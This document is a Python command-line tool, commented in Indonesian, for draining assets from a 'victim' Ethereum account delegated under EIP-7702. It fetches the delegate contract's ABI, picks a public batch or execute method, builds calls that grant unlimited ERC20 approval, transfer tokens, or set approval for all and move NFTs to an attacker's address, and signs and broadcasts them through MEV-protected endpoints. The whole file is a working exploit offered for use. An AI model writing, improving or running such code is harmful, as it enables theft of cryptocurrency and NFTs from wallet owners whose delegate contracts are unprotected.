#!/usr/bin/env python3
"""
mulungeip7702_upgraded.py  v2 (ABI Auto-Detect Edition)
────────────────────────────────────────────────────────────────────────────
EIP-7702 Delegated Batch Executor — now with SMART ABI + METHOD detection

Fitur utama upgrade terbaru:
• Auto-fetch verified ABI dari block explorer (Etherscan, BscScan, dll)
• Auto-detect method batch terbaik yang PUBLIC di kontrak tersebut
  (aggregate3Value / multicall / execute / batch dll)
• Sangat mengurangi kemungkinan revert karena salah fungsi/ABI
• Tetap support fallback ke custom ABI JSON atau default
• Cocok untuk testing kontrak delegate apapun yang kamu temukan

"detect abi kontrak itu, trus methodnya pakai yang public di kontrak itu"

Requires: web3>=7.0 + requests
pip install web3 eth-account requests
────────────────────────────────────────────────────────────────────────────
"""

import sys
import json
from decimal import Decimal
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple

import requests
from web3 import Web3
from web3.exceptions import ContractLogicError
from eth_account import Account
from web3.middleware import ExtraDataToPOAMiddleware

# ─── Constants ────────────────────────────────────────────────
EIP7702_PREFIX = bytes.fromhex("ef0100")

MEV_PROTECTED_RPC: dict[int, str] = {
    1:  "https://rpc.flashbots.net/fast",
    56: "https://bscrpc.pancakeswap.finance",
}

# Explorer API (public endpoint, rate limit biasanya cukup untuk tool ini)
EXPLORER_CONFIG: dict[int, dict] = {
    1:    {"name": "Etherscan",     "api_url": "https://api.etherscan.io/api"},
    56:   {"name": "BscScan",       "api_url": "https://api.bscscan.com/api"},
    137:  {"name": "Polygonscan",   "api_url": "https://api.polygonscan.com/api"},
    42161:{"name": "Arbiscan",      "api_url": "https://api.arbiscan.io/api"},
    10:   {"name": "Optimism",      "api_url": "https://api-optimistic.etherscan.io/api"},
    8453: {"name": "Basescan",      "api_url": "https://api.basescan.org/api"},
    43114:{"name": "Snowtrace",     "api_url": "https://api.snowtrace.io/api"},
}

DEFAULT_DELEGATE_ABI = [  # fallback kalau tidak verified
    {
        "name": "aggregate3Value",
        "type": "function",
        "stateMutability": "payable",
        "inputs": [{
            "name": "calls",
            "type": "tuple[]",
            "components": [
                {"name": "target", "type": "address"},
                {"name": "allowFailure", "type": "bool"},
                {"name": "value", "type": "uint256"},
                {"name": "callData", "type": "bytes"},
            ],
        }],
        "outputs": [{
            "name": "returnData",
            "type": "tuple[]",
            "components": [
                {"name": "success", "type": "bool"},
                {"name": "returnData", "type": "bytes"},
            ],
        }],
    }
]

# Token ABIs (ringkas)
ERC20_ABI = [
    {"name": "approve", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "outputs": [{"type": "bool"}]},
    {"name": "transfer", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}], "outputs": [{"type": "bool"}]},
    {"name": "balanceOf", "type": "function", "stateMutability": "view",
     "inputs": [{"name": "account", "type": "address"}], "outputs": [{"type": "uint256"}]},
    {"name": "decimals", "type": "function", "stateMutability": "view", "inputs": [], "outputs": [{"type": "uint8"}]},
]

NFT_ABI = [
    {"name": "setApprovalForAll", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "operator", "type": "address"}, {"name": "approved", "type": "bool"}], "outputs": []},
    {"name": "safeTransferFrom", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"}, {"name": "tokenId", "type": "uint256"}], "outputs": []},
]

ERC1155_ABI = [
    {"name": "setApprovalForAll", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "operator", "type": "address"}, {"name": "approved", "type": "bool"}], "outputs": []},
    {"name": "safeTransferFrom", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"},
                {"name": "id", "type": "uint256"}, {"name": "amount", "type": "uint256"}, {"name": "data", "type": "bytes"}], "outputs": []},
]

# ─── Helper functions ─────────────────────────────────────────

def banner(text: str):
    print(f"\n{'═'*68}")
    print(f"  {text}")
    print(f"{'═'*68}")

def prompt(label: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    val = input(f"  ▶  {label}{suffix}: ").strip()
    return val if val else default

def prompt_int(label: str, default: int = 0) -> int:
    raw = prompt(label, str(default))
    try: return int(raw)
    except: 
        print(f"     ! Invalid, pakai {default}")
        return default

def prompt_addr(label: str) -> str:
    while True:
        try:
            return Web3.to_checksum_address(prompt(label))
        except:
            print("     ! Alamat tidak valid, coba lagi.")

def fetch_verified_abi(address: str, chain_id: int) -> Optional[List[Dict[str, Any]]]:
    """Fetch verified ABI from block explorer. Returns ABI or None."""
    if chain_id not in EXPLORER_CONFIG:
        print(f"  ℹ  Chain {chain_id} belum ada config explorer-nya.")
        return None

    cfg = EXPLORER_CONFIG[chain_id]
    params = {
        "module": "contract",
        "action": "getabi",
        "address": Web3.to_checksum_address(address),
    }
    try:
        r = requests.get(cfg["api_url"], params=params, timeout=12)
        data = r.json()
        if data.get("status") == "1" and data.get("result"):
            abi = json.loads(data["result"])
            print(f"  ✔ ABI berhasil di-fetch dari {cfg['name']} (kontrak verified)")
            return abi
        else:
            print(f"  ℹ  Kontrak tidak verified di {cfg['name']} atau rate limit")
            return None
    except Exception as e:
        print(f"  ⚠  Gagal fetch ABI dari explorer: {e}")
        return None

def find_best_batch_method(abi: List[Dict[str, Any]]) -> Optional[str]:
    """
    Pilih method batch/multicall/execute terbaik yang PUBLIC di kontrak.
    Prioritas: aggregate* > multicall* > batch/execute > lainnya (yang ambil array/struct)
    """
    candidates: List[Tuple[int, str]] = []
    priority_keywords = {
        "aggregate3value": 100,
        "aggregate3": 95,
        "aggregate": 85,
        "multicall": 80,
        "batchcall": 70,
        "batch": 65,
        "execute": 60,
        "dispatch": 55,
        "processcalls": 50,
    }

    for item in abi:
        if item.get("type") != "function":
            continue
        state = item.get("stateMutability", "")
        if state not in ("payable", "nonpayable"):
            continue

        inputs = item.get("inputs", [])
        # Harus punya input array atau tuple[]
        has_array_or_tuple = any(
            inp.get("type", "").endswith("[]") or bool(inp.get("components"))
            for inp in inputs
        )
        if not has_array_or_tuple:
            continue

        name = item.get("name", "")
        name_lower = name.lower()
        score = 10  # base score for having array input

        for kw, pts in priority_keywords.items():
            if kw in name_lower:
                score = max(score, pts)
                break

        if state == "payable":
            score += 8

        candidates.append((score, name))

    if not candidates:
        return None

    candidates.sort(key=lambda x: x[0], reverse=True)
    best = candidates[0][1]
    print(f"  ✔ Method terbaik terdeteksi otomatis: {best} (score {candidates[0][0]})")
    return best

def load_abi_from_file(path: str) -> List[Dict]:
    try:
        return json.loads(Path(path).read_text())
    except Exception as e:
        print(f"  ✗ Gagal baca ABI file: {e}")
        return DEFAULT_DELEGATE_ABI

def check_eip7702_delegation(w3: Web3, victim: str, expected: str = None) -> Tuple[bool, str]:
    code = w3.eth.get_code(Web3.to_checksum_address(victim))
    if len(code) != 23 or code[:3] != EIP7702_PREFIX:
        return False, ""
    delegated = Web3.to_checksum_address("0x" + code[3:].hex())
    if expected:
        return delegated.lower() == Web3.to_checksum_address(expected).lower(), delegated
    return True, delegated

def uint256_max() -> int:
    return (1 << 256) - 1

# ─── Calldata builders (sama) ─────────────────────────────────

def _abi_to_bytes(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str.removeprefix("0x"))

def build_erc20_approve_unli(w3, token, spender):
    c = w3.eth.contract(address=token, abi=ERC20_ABI)
    return _abi_to_bytes(c.encode_abi("approve", [spender, uint256_max()]))

def build_erc20_transfer(w3, token, to, amount):
    c = w3.eth.contract(address=token, abi=ERC20_ABI)
    return _abi_to_bytes(c.encode_abi("transfer", [to, amount]))

def build_nft_approve_all(w3, nft, operator):
    c = w3.eth.contract(address=nft, abi=NFT_ABI)
    return _abi_to_bytes(c.encode_abi("setApprovalForAll", [operator, True]))

def build_erc721_safe_transfer(w3, nft, fr, to, tid):
    c = w3.eth.contract(address=nft, abi=NFT_ABI)
    return _abi_to_bytes(c.encode_abi("safeTransferFrom", [fr, to, tid]))

def build_erc1155_safe_transfer(w3, nft, fr, to, tid, amt):
    c = w3.eth.contract(address=nft, abi=ERC1155_ABI)
    return _abi_to_bytes(c.encode_abi("safeTransferFrom", [fr, to, tid, amt, b""]))

def build_erc1155_approve_all(w3, nft, operator):
    c = w3.eth.contract(address=nft, abi=ERC1155_ABI)
    return _abi_to_bytes(c.encode_abi("setApprovalForAll", [operator, True]))

def build_calls(w3: Web3, victim: str) -> list[dict]:
    calls = []
    menu = {
        "1": "ERC20 approve unlimited",
        "2": "ERC20 transfer",
        "3": "ERC721 setApprovalForAll",
        "4": "ERC721 safeTransferFrom",
        "5": "ERC1155 setApprovalForAll",
        "6": "ERC1155 safeTransferFrom",
        "7": "Custom raw calldata",
    }
    while True:
        banner(f"Call #{len(calls)+1}  (ketik 'd' untuk selesai)")
        print("  Target type: 1) Custom  2) ERC20  3) ERC721  4) ERC1155")
        ttype = prompt("Pilihan", "1")
        target = prompt_addr("Target contract address")

        val_str = prompt("Value (wei) untuk call ini", "0")
        call_value = int(val_str) if val_str.isdigit() else 0

        print("  Calldata type:")
        for k, v in menu.items():
            print(f"    {k}) {v}")
        choice = prompt("Pilihan", "1")

        cd = b""
        if choice == "1":
            sp = prompt_addr("Spender")
            cd = build_erc20_approve_unli(w3, target, sp)
        elif choice == "2":
            rcpt = prompt_addr("Recipient")
            amt_str = prompt("Amount (token units)")
            try:
                dec = w3.eth.contract(target, abi=ERC20_ABI).functions.decimals().call()
                amt = int(Decimal(amt_str) * (10 ** dec))
            except:
                amt = int(Decimal(amt_str))
            cd = build_erc20_transfer(w3, target, rcpt, amt)
        elif choice == "3":
            op = prompt_addr("Operator")
            cd = build_nft_approve_all(w3, target, op)
        elif choice == "4":
            to_ = prompt_addr("To")
            tid = prompt_int("Token ID")
            cd = build_erc721_safe_transfer(w3, target, victim, to_, tid)
        elif choice == "5":
            op = prompt_addr("Operator")
            cd = build_erc1155_approve_all(w3, target, op)
        elif choice == "6":
            to_ = prompt_addr("To")
            tid = prompt_int("Token ID")
            amt = prompt_int("Amount", 1)
            cd = build_erc1155_safe_transfer(w3, target, victim, to_, tid, amt)
        elif choice == "7":
            hx = prompt("Raw calldata hex").removeprefix("0x")
            cd = bytes.fromhex(hx)

        calls.append({
            "target": Web3.to_checksum_address(target),
            "allowFailure": False,
            "value": call_value,
            "callData": cd,
        })
        print(f"  ✔ Call #{len(calls)} added")
        if prompt("Tambah call lagi? (y/n)", "n").lower() != "y":
            break
    return calls

# ─── Main ─────────────────────────────────────────────────────

def main():
    banner("mulungeip7702_upgraded v2  —  Auto ABI + Public Method Detection")

    rpc_url = prompt("RPC URL")
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
    if not w3.is_connected():
        print("✗ RPC gagal connect"); sys.exit(1)

    chain_id = w3.eth.chain_id
    print(f"✔ Connected — chain_id={chain_id}")

    protected = MEV_PROTECTED_RPC.get(chain_id)
    w3_send = Web3(Web3.HTTPProvider(protected)) if protected else w3
    if protected:
        print(f"✔ MEV-protected send: {protected}")

    pk = prompt("Sender PK (hex)")
    pk = "0x" + pk.removeprefix("0x")
    sender = Account.from_key(pk).address
    print(f"✔ Sender: {sender}")

    victim = prompt_addr("Victim EOA (yang di-delegate)")
    delegate = prompt_addr("Delegate Contract Address (kontrak tadi)")

    # ========== AUTO DETECT ABI + METHOD (Fitur utama request kamu) ==========
    print("\n  Mendeteksi ABI & method public dari kontrak delegate...")
    auto_abi = fetch_verified_abi(delegate, chain_id)

    if auto_abi:
        delegate_abi = auto_abi
        detected_method = find_best_batch_method(delegate_abi)
        if detected_method:
            batch_method = detected_method
        else:
            batch_method = prompt("Method batch tidak terdeteksi otomatis. Masukkan manual", "aggregate3Value")
    else:
        print("  Fallback ke manual / default ABI")
        if prompt("Pakai file ABI JSON custom? (y/n)", "n").lower() == "y":
            delegate_abi = load_abi_from_file(prompt("Path ke ABI JSON"))
        else:
            delegate_abi = DEFAULT_DELEGATE_ABI
        batch_method = prompt("Nama method batch", "aggregate3Value")

    # Cek delegation
    is_del, actual = check_eip7702_delegation(w3, victim, delegate)
    if is_del:
        print(f"✔ Victim didelegasikan ke {actual}")
    else:
        print(f"✗ Bukan delegate ke {delegate} (sebenarnya: {actual or 'tidak ada'})")
        if prompt("Lanjutkan anyway? (y/n)", "n").lower() != "y":
            sys.exit(0)

    calls = build_calls(w3, victim)
    if not calls:
        print("Tidak ada call. Exit."); sys.exit(0)

    total_value = sum(c["value"] for c in calls)

    # Encode pakai ABI & method yang sudah di-detect / dipilih
    try:
        dc = w3.eth.contract(address=delegate, abi=delegate_abi)
        tx_data = dc.encode_abi(
            abi_element_identifier=batch_method,
            args=[[ (c["target"], c["allowFailure"], c["value"], c["callData"]) for c in calls ]]
        )
    except Exception as e:
        print(f"✗ Gagal encode_abi dengan method '{batch_method}': {e}")
        print("   Coba ganti method atau pastikan struct input sesuai.")
        sys.exit(1)

    # Gas & EIP-1559
    latest = w3.eth.get_block("latest")
    base = latest.get("baseFeePerGas", 0)
    max_fee = max(int(base * 1.15), 50_000_000)
    prio = max(int(max_fee * 0.10), 50_000_000)

    nonce = w3.eth.get_transaction_count(sender, "pending")
    gas_est = w3.eth.estimate_gas({"from": sender, "to": victim, "value": total_value, "data": tx_data, "chainId": chain_id})
    gas_limit = int(gas_est * 1.10)

    tx = {
        "type": 2,
        "chainId": chain_id,
        "nonce": nonce,
        "to": victim,
        "value": total_value,
        "data": tx_data,
        "gas": gas_limit,
        "maxFeePerGas": max_fee,
        "maxPriorityFeePerGas": prio,
    }

    banner("TX SUMMARY")
    print(f"Delegate Contract : {delegate}")
    print(f"Method digunakan  : {batch_method}  (public method dari kontrak)")
    print(f"Victim →          : {victim}")
    print(f"Sender            : {sender}")
    print(f"Total value       : {w3.from_wei(total_value, 'ether')} ETH")
    print(f"Gas limit         : {gas_limit}")
    print(f"Calls             : {len(calls)}")

    if prompt("\nSign & broadcast? (y/n)", "n").lower() != "y":
        print("Dibatalkan."); sys.exit(0)

    signed = w3.eth.account.sign_transaction(tx, pk)
    txh = w3_send.eth.send_raw_transaction(signed.raw_transaction)
    print(f"\n✔ Tx sent: {txh.hex()}")

    if prompt("Tunggu receipt? (y/n)", "y").lower() == "y":
        rcpt = w3.eth.wait_for_transaction_receipt(txh, timeout=300)
        status = "SUCCESS" if rcpt.get("status") == 1 else "REVERTED"
        print(f"\n{status} | Block {rcpt['blockNumber']} | Gas used: {rcpt['gasUsed']}")

if __name__ == "__main__":
    main()